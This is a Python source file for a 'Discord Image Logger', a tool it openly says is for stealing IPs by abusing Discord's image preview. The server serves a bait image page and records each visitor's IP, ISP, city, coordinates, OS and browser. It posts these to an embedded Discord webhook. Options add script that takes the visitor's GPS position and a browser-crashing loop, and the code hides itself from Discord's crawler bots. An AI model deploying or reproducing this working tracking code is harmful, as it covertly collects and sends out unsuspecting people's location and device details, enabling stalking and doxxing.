# Discord Image Logger
# By Dexty | https://github.com/xdexty0

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "Dexty"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1403114191325233293/DOkKf6x2cIMG230mXgroG5rBY8lR5PZfNVXtEQewxS3QjDXsg2SiqACHBwJoI8raDJCF",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/xdexty0

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
